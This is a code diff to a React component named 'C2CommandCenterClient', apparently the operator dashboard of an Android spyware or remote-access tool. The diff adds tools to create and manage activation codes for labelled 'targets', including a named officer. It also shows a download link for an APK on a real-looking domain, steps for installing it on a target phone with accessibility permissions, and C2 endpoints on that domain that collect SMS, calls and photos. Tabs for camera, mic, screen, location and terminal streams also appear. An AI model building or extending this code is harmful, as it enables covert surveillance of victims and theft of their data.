@@ -46,7 +46,8 @@ import {
   Send,
   SlidersHorizontal,
   FolderArchive,
-  Key
+  Key,
+  Plus
 } from "lucide-react";
 import { cn } from "@/lib/utils";
 
@@ -72,7 +73,12 @@ export default function C2CommandCenterClient({
   const [liveStreamTab, setLiveStreamTab] = useState<"overview" | "app_auth" | "camera" | "mic" | "screen" | "map" | "terminal">("overview");
 
   const [activationCodes, setActivationCodes] = useState<string[]>([]);
+  const [activationRecords, setActivationRecords] = useState<{code:string;name:string;createdAt:string;status:string;usedByDevice?:string}[]>([]);
   const [newCodeLoading, setNewCodeLoading] = useState<boolean>(false);
+  const [newCodeName, setNewCodeName] = useState<string>("");
+  const [customCodeInput, setCustomCodeInput] = useState<string>("");
+  const [customCodeName, setCustomCodeName] = useState<string>("");
+  const [customCodeLoading, setCustomCodeLoading] = useState<boolean>(false);
   const [copiedCode, setCopiedCode] = useState<string | null>(null);
 
   const [selectedDevice, setSelectedDevice] = useState<string>("ALL");
@@ -165,6 +171,9 @@ export default function C2CommandCenterClient({
         if (json.activation_codes) {
           setActivationCodes(json.activation_codes);
         }
+        if (json.activation_records) {
+          setActivationRecords(json.activation_records);
+        }
       } else {
         setIsConnected(false);
       }
@@ -198,16 +207,63 @@ export default function C2CommandCenterClient({
       const res = await fetch("/api/c2", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ action: "generate_activation_code" })
+        body: JSON.stringify({ action: "generate_activation_code", name: newCodeName.trim() || undefined })
       });
       const json = await res.json();
-      if (json.success && json.activation_codes) {
-        setActivationCodes(json.activation_codes);
+      if (json.success) {
+        if (json.activation_codes) setActivationCodes(json.activation_codes);
+        if (json.activation_records) setActivationRecords(json.activation_records);
+        setNewCodeName("");
       }
     } catch (e) {
       console.error("Failed to generate activation code", e);
     } finally {
       setNewCodeLoading(false);
+    }
+  };
+
+  const handleAddCustomCode = async () => {
+    const clean = customCodeInput.replace(/\D/g, "");
+    if (!clean) return;
+    setCustomCodeLoading(true);
+    try {
+      const res = await fetch("/api/c2", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          action: "add_activation_code",
+          code: clean,
+          name: customCodeName.trim() || undefined
+        })
+      });
+      const json = await res.json();
+      if (json.success) {
+        if (json.activation_codes) setActivationCodes(json.activation_codes);
+        if (json.activation_records) setActivationRecords(json.activation_records);
+        setCustomCodeInput("");
+        setCustomCodeName("");
+      }
+    } catch (e) {
+      console.error("Failed to add custom activation code", e);
+    } finally {
+      setCustomCodeLoading(false);
+    }
+  };
+
+  const handleDeleteActivationCode = async (code: string) => {
+    try {
+      const res = await fetch("/api/c2", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "delete_activation_code", code })
+      });
+      const json = await res.json();
+      if (json.success) {
+        if (json.activation_codes) setActivationCodes(json.activation_codes);
+        if (json.activation_records) setActivationRecords(json.activation_records);
+      }
+    } catch (e) {
+      console.error("Failed to delete activation code", e);
     }
   };
 
@@ -460,6 +516,17 @@ export default function C2CommandCenterClient({
 
   // Latest coordinates from logs
   const latestLocLog = logs.find((l: any) => l.latitude && l.longitude);
+
+  const computedActivationRecords = activationRecords.length > 0
+    ? activationRecords
+    : ((data?.activation_records && data.activation_records.length > 0)
+      ? data.activation_records
+      : (activationCodes.length > 0 ? activationCodes : (data?.activation_codes || [])).map((c: string) => ({
+          code: c,
+          name: "Target " + c.slice(-4),
+          createdAt: new Date().toISOString(),
+          status: "active"
+        })));
 
   return (
     <div className="space-y-6 max-w-7xl mx-auto font-sans pb-16">
@@ -788,81 +855,218 @@ export default function C2CommandCenterClient({
 
                   {liveStreamTab === "app_auth" && (
                     <div className="w-full space-y-4 text-left">
-                      <div className="flex items-center justify-between">
+                      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-800">
                         <div>
                           <h3 className="text-sm font-black text-white flex items-center gap-2">
-                            <Key size={16} className="text-emerald-400" /> App Authentication Codes
+                            <Key size={16} className="text-emerald-400" /> App Target Authentication & Codes
                           </h3>
                           <p className="text-[11px] text-slate-400 mt-0.5">
-                            These codes activate the Android agent on target devices via{" "}
-                            <span className="font-mono text-emerald-400">kpts.com.pk/c2/register/activate/</span>
+                            Purely numerical 8-digit activation codes for deploying and binding target devices to this C2 hub.
                           </p>
                         </div>
-                        <button
-                          onClick={handleGenerateActivationCode}
-                          disabled={newCodeLoading}
-                          className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold flex items-center gap-1.5 disabled:opacity-50 cursor-pointer shadow"
-                        >
-                          {newCodeLoading ? <RefreshCw size={12} className="animate-spin" /> : <Key size={12} />}
-                          Generate New Code
-                        </button>
                       </div>
 
-                      {/* APK Download */}
-                      <div className="bg-slate-900 border border-slate-700 rounded-2xl p-4 space-y-2">
-                        <p className="text-xs font-bold text-slate-300 flex items-center gap-2">
-                          <Download size={14} className="text-blue-400" /> APK Download (Auto-connects to this C2)
-                        </p>
-                        <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl p-2.5">
-                          <span className="text-[11px] font-mono text-emerald-300 flex-1 break-all">https://kpts.com.pk/app.apk</span>
-                          <button
-                            onClick={() => handleCopyCode("https://kpts.com.pk/app.apk")}
-                            className="px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-200 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer"
-                          >
-                            {copiedCode === "https://kpts.com.pk/app.apk" ? <CheckCircle2 size={11} className="text-emerald-400" /> : <Copy size={11} />}
-                            {copiedCode === "https://kpts.com.pk/app.apk" ? "Copied!" : "Copy"}
-                          </button>
+                      {/* Code Generator & Manual Add Grid */}
+                      <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
+                        {/* Auto Generate 8-Digit Code */}
+                        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 space-y-3">
+                          <p className="text-xs font-bold text-slate-200 flex items-center gap-1.5">
+                            <Sparkles size={14} className="text-amber-400" /> Auto-Generate 8-Digit Numerical Code
+                          </p>
+                          <div className="flex flex-col sm:flex-row items-center gap-2">
+                            <input
+                              type="text"
+                              value={newCodeName}
+                              onChange={(e) => setNewCodeName(e.target.value)}
+                              placeholder="Target Name / Label (e.g. Officer Wasim, Unit 01)"
+                              className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 rounded-xl px-3 py-2 text-xs text-white placeholder-slate-500 focus:outline-none"
+                            />
+                            <button
+                              onClick={handleGenerateActivationCode}
+                              disabled={newCodeLoading}
+                              className="w-full sm:w-auto shrink-0 px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-md transition-colors"
+                            >
+                              {newCodeLoading ? <RefreshCw size={12} className="animate-spin" /> : <Key size={12} />}
+                              <span>Generate</span>
+                            </button>
+                          </div>
+                        </div>
+
+                        {/* Custom Numerical Code */}
+                        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 space-y-3">
+                          <p className="text-xs font-bold text-slate-200 flex items-center gap-1.5">
+                            <Plus size={14} className="text-blue-400" /> Custom Numerical Code
+                          </p>
+                          <div className="flex flex-col sm:flex-row items-center gap-2">
+                            <input
+                              type="text"
+                              inputMode="numeric"
+                              value={customCodeInput}
+                              onChange={(e) => setCustomCodeInput(e.target.value.replace(/\D/g, ""))}
+                              placeholder="8-Digit Code (e.g. 84920153)"
+                              className="w-full sm:w-40 bg-slate-950 border border-slate-800 focus:border-blue-500 rounded-xl px-3 py-2 text-xs font-mono text-emerald-300 placeholder-slate-500 focus:outline-none"
+                            />
+                            <input
+                              type="text"
+                              value={customCodeName}
+                              onChange={(e) => setCustomCodeName(e.target.value)}
+                              placeholder="Target Name (optional)"
+                              className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500 rounded-xl px-3 py-2 text-xs text-white placeholder-slate-500 focus:outline-none"
+                            />
+                            <button
+                              onClick={handleAddCustomCode}
+                              disabled={customCodeLoading || !customCodeInput.trim()}
+                              className="w-full sm:w-auto shrink-0 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-md transition-colors"
+                            >
+                              {customCodeLoading ? <RefreshCw size={12} className="animate-spin" /> : <Plus size={12} />}
+                              <span>Save</span>
+                            </button>
+                          </div>
                         </div>
                       </div>
 
-                      {/* Activation Codes List */}
-                      <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
-                        {(activationCodes.length > 0 ? activationCodes : (data?.activation_codes || [])).map((code: string, idx: number) => (
-                          <div key={code} className="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-xl px-3 py-2">
-                            <span className="text-[10px] text-slate-500 w-5 shrink-0">#{idx + 1}</span>
-                            <span className="font-mono text-emerald-300 text-xs flex-1 select-all">{code}</span>
-                            <button
-                              onClick={() => handleCopyCode(code)}
-                              className="px-2 py-0.5 bg-slate-700 hover:bg-emerald-800 text-slate-200 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-colors"
+                      {/* APK Download & Distribution */}
+                      <div className="bg-slate-900/90 border border-slate-700/80 rounded-2xl p-4 space-y-2">
+                        <div className="flex items-center justify-between">
+                          <p className="text-xs font-bold text-slate-300 flex items-center gap-2">
+                            <Download size={14} className="text-blue-400" /> Production APK Download & Deploy Link
+                          </p>
+                          <span className="text-[10px] text-emerald-400 font-mono">v2.4.0 • Ready</span>
+                        </div>
+                        <div className="flex flex-col sm:flex-row items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl p-2.5">
+                          <span className="text-[11px] font-mono text-emerald-300 flex-1 break-all select-all">https://kpts.com.pk/app.apk</span>
+                          <div className="flex items-center gap-2 w-full sm:w-auto">
+                            <a
+                              href="https://kpts.com.pk/app.apk"
+                              download="app.apk"
+                              target="_blank"
+                              rel="noreferrer"
+                              className="px-3 py-1.5 bg-blue-600/30 hover:bg-blue-600 text-blue-200 hover:text-white border border-blue-500/40 rounded-lg text-[11px] font-bold flex items-center gap-1 cursor-pointer transition-colors"
                             >
-                              {copiedCode === code ? <CheckCircle2 size={11} className="text-emerald-400" /> : <Copy size={11} />}
-                              {copiedCode === code ? "Copied!" : "Copy"}
+                              <Download size={12} /> Direct Download
+                            </a>
+                            <button
+                              onClick={() => handleCopyCode("https://kpts.com.pk/app.apk")}
+                              className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg text-[11px] font-bold flex items-center gap-1 cursor-pointer transition-colors"
+                            >
+                              {copiedCode === "https://kpts.com.pk/app.apk" ? <CheckCircle2 size={12} className="text-emerald-400" /> : <Copy size={12} />}
+                              {copiedCode === "https://kpts.com.pk/app.apk" ? "Copied!" : "Copy Link"}
                             </button>
                           </div>
-                        ))}
-                        {(activationCodes.length === 0 && !data?.activation_codes?.length) && (
-                          <div className="text-center py-6 text-slate-500 text-xs">
-                            <Key size={28} className="mx-auto mb-2 text-slate-700" />
-                            No codes yet. Generate one above.
-                          </div>
-                        )}
+                        </div>
                       </div>
 
-                      {/* C2 Endpoint Info */}
-                      <div className="bg-slate-900 border border-emerald-900/40 rounded-2xl p-3 space-y-1.5">
-                        <p className="text-[11px] font-bold text-emerald-400 uppercase tracking-wider">App → C2 Sync Endpoints</p>
-                        {[
-                          ["Auth", "kpts.com.pk/c2/register/auth/"],
-                          ["Activate", "kpts.com.pk/c2/register/activate/"],
-                          ["Commands", "kpts.com.pk/c2/preference/pendingcommand?appServiceId=..."],
-                          ["SMS/Calls", "kpts.com.pk/c2/payload/sms/ & /payload/call/"],
-                          ["Assets", "kpts.com.pk/c2/payload/upload/asset/photo"],
-                        ].map(([label, ep]) => (
-                          <div key={label} className="flex items-start gap-2 text-[10px]">
-                            <span className="text-slate-500 w-14 shrink-0">{label}</span>
-                            <span className="font-mono text-slate-300 break-all">{ep}</span>
-                          </div>
-                        ))}
+                      {/* Activation Codes Records List */}
+                      <div className="space-y-2">
+                        <div className="flex items-center justify-between px-1">
+                          <p className="text-xs font-bold text-slate-300">
+                            Registered Activation Codes & Status ({computedActivationRecords.length})
+                          </p>
+                          <span className="text-[10px] text-slate-500">Purely numerical • Auto-bound on device start</span>
+                        </div>
+
+                        <div className="space-y-2 max-h-64 overflow-y-auto pr-1">
+                          {(() => {
+                            const recs = computedActivationRecords;
+
+                            if (!recs || recs.length === 0) {
+                              return (
+                                <div className="text-center py-8 bg-slate-900/50 border border-slate-800/80 rounded-2xl text-slate-500 text-xs">
+                                  <Key size={32} className="mx-auto mb-2 text-slate-700" />
+                                  No activation codes yet. Generate or add one above.
+                                </div>
+                              );
+                            }
+
+                            return recs.map((record: any, idx: number) => {
+                              const codeStr = (record.code || "").toString();
+                              const isUsed = record.status === "used";
+
+                              return (
+                                <div
+                                  key={codeStr + idx}
+                                  className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 bg-slate-900 border border-slate-800 hover:border-slate-700 rounded-xl px-3.5 py-2.5 transition-all"
+                                >
+                                  <div className="flex items-center gap-3">
+                                    <span className="text-[10px] text-slate-500 font-mono w-5 shrink-0">#{idx + 1}</span>
+                                    <div>
+                                      <div className="flex items-center gap-2">
+                                        <span className="text-xs font-bold text-white">{record.name || `Target ${codeStr.slice(-4)}`}</span>
+                                        {isUsed ? (
+                                          <span className="px-2 py-0.5 bg-blue-500/20 border border-blue-500/40 text-blue-300 rounded text-[9px] font-bold flex items-center gap-1">
+                                            <CheckCircle2 size={10} className="text-blue-400" /> Activated
+                                            {record.usedByDevice && <span className="font-mono text-slate-400">({record.usedByDevice.slice(0, 8)}...)</span>}
+                                          </span>
+                                        ) : (
+                                          <span className="px-2 py-0.5 bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 rounded text-[9px] font-bold flex items-center gap-1">
+                                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Available
+                                          </span>
+                                        )}
+                                      </div>
+                                      <p className="text-[10px] text-slate-500 mt-0.5">
+                                        Created: {new Date(record.createdAt || Date.now()).toLocaleDateString()} {new Date(record.createdAt || Date.now()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
+                                      </p>
+                                    </div>
+                                  </div>
+
+                                  <div className="flex items-center gap-2 ml-8 sm:ml-0">
+                                    <span className="font-mono text-emerald-300 text-sm font-black tracking-widest bg-slate-950 px-2.5 py-1 rounded-lg border border-slate-800 select-all">
+                                      {codeStr}
+                                    </span>
+                                    <button
+                                      onClick={() => handleCopyCode(codeStr)}
+                                      title="Copy code"
+                                      className="px-2.5 py-1 bg-slate-800 hover:bg-emerald-800 text-slate-200 rounded-lg text-xs font-bold flex items-center gap-1 cursor-pointer transition-colors"
+                                    >
+                                      {copiedCode === codeStr ? <CheckCircle2 size={12} className="text-emerald-400" /> : <Copy size={12} />}
+                                      {copiedCode === codeStr ? "Copied" : "Copy"}
+                                    </button>
+                                    <button
+                                      onClick={() => handleDeleteActivationCode(codeStr)}
+                                      title="Delete code"
+                                      className="p-1.5 bg-slate-800 hover:bg-rose-950/60 text-slate-400 hover:text-rose-400 rounded-lg text-xs cursor-pointer transition-colors"
+                                    >
+                                      <Trash2 size={12} />
+                                    </button>
+                                  </div>
+                                </div>
+                              );
+                            });
+                          })()}
+                        </div>
+                      </div>
+
+                      {/* C2 Sync Endpoints & Target Flow Guide */}
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-2">
+                        {/* Target Onboarding Steps */}
+                        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-3.5 space-y-2">
+                          <p className="text-[11px] font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
+                            <Smartphone size={13} className="text-emerald-400" /> Target Device Onboarding Steps
+                          </p>
+                          <ol className="text-[11px] text-slate-400 space-y-1.5 list-decimal list-inside">
+                            <li>Download <span className="font-mono text-emerald-300">app.apk</span> on the target Android phone.</li>
+                            <li>Grant required background & accessibility permissions upon prompt.</li>
+                            <li>Enter the 8-digit numerical activation code generated above.</li>
+                            <li>Device registers with C2 and appears in this Command Center immediately.</li>
+                          </ol>
+                        </div>
+
+                        {/* Active API Endpoints */}
+                        <div className="bg-slate-900 border border-emerald-900/30 rounded-2xl p-3.5 space-y-2">
+                          <p className="text-[11px] font-bold text-emerald-400 uppercase tracking-wider">Active C2 API Endpoints</p>
+                          {[
+                            ["Auth", "kpts.com.pk/c2/register/auth/"],
+                            ["Activate", "kpts.com.pk/c2/register/activate/"],
+                            ["Commands", "kpts.com.pk/c2/preference/pendingcommand"],
+                            ["Telemetry", "kpts.com.pk/c2/payload/sms/ & /call/"],
+                            ["Media/Files", "kpts.com.pk/c2/payload/upload/asset/photo"],
+                          ].map(([label, ep]) => (
+                            <div key={label} className="flex items-start gap-2 text-[10px]">
+                              <span className="text-slate-500 w-16 shrink-0">{label}</span>
+                              <span className="font-mono text-slate-300 break-all">{ep}</span>
+                            </div>
+                          ))}
+                        </div>
                       </div>
                     </div>
                   )}
